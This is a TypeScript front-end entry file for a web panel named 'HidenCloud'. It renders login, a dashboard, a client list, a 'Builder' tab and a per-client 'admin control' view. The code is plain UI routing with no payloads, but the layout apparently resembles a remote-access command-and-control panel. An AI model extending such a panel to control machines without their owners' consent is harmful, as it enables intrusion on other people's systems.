import { api } from "./api.js";
import { renderLogin } from "./login.js";
import { renderDashboard } from "./dashboard.js";
import { renderClients } from "./clients.js";
import { renderBuilder, bindBuilder } from "./builder.js";
import { renderAdminControl, bindAdminControl } from "./admin-control.js";
import type { StatsResponse, TabId } from "./types.js";

const root = document.getElementById("app") as HTMLElement;

const TABS: { id: TabId; label: string }[] = [
  { id: "dashboard", label: "Dashboard" },
  { id: "clients", label: "Clients" },
  { id: "builder", label: "Builder" },
];

let currentTab: TabId = "dashboard";
let connectedId: string | null = null;
let data: StatsResponse | null = null;

async function showPanel(): Promise<void> {
  data = await api.stats();
  root.innerHTML = `
    <div class="shell">
      <aside class="sidebar">
        <div class="brand" style="margin-bottom:16px"><span class="dot"></span> HidenCloud</div>
        ${TABS.map((t) => `<button class="nav-btn" data-tab="${t.id}">${t.label}</button>`).join("")}
        <div class="spacer"></div>
        <button class="logout" id="logout">Sign out</button>
      </aside>
      <main class="main" id="view"></main>
    </div>
  `;

  root.querySelectorAll<HTMLButtonElement>(".nav-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      currentTab = btn.dataset["tab"] as TabId;
      connectedId = null;
      renderTab();
    });
  });

  root.querySelector<HTMLButtonElement>("#logout")!.addEventListener("click", async () => {
    await api.logout();
    boot();
  });

  renderTab();
}

async function renderTab(): Promise<void> {
  const view = root.querySelector<HTMLElement>("#view")!;
  root.querySelectorAll<HTMLButtonElement>(".nav-btn").forEach((b) => {
    b.classList.toggle("active", b.dataset["tab"] === currentTab);
  });

  if (currentTab === "dashboard") {
    view.innerHTML = renderDashboard(data!);
    return;
  }

  if (currentTab === "builder") {
    view.innerHTML = renderBuilder();
    bindBuilder(view);
    return;
  }

  // clients tab
  if (connectedId) {
    view.innerHTML = `<div class="card">Connecting to ${connectedId}…</div>`;
    try {
      const detail = await api.client(connectedId);
      view.innerHTML = renderAdminControl(detail);
      bindAdminControl(view, detail, () => {
        connectedId = null;
        void renderTab();
      });
    } catch {
      connectedId = null;
      view.innerHTML = `<div class="card">Failed to connect.</div>`;
    }
    return;
  }

  view.innerHTML = renderClients(data!);
  view.querySelectorAll<HTMLButtonElement>(".connect-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      connectedId = btn.dataset["id"] ?? null;
      void renderTab();
    });
  });
}

async function boot(): Promise<void> {
  if (await api.me()) {
    await showPanel();
  } else {
    renderLogin(root, () => void showPanel());
  }
}

void boot();
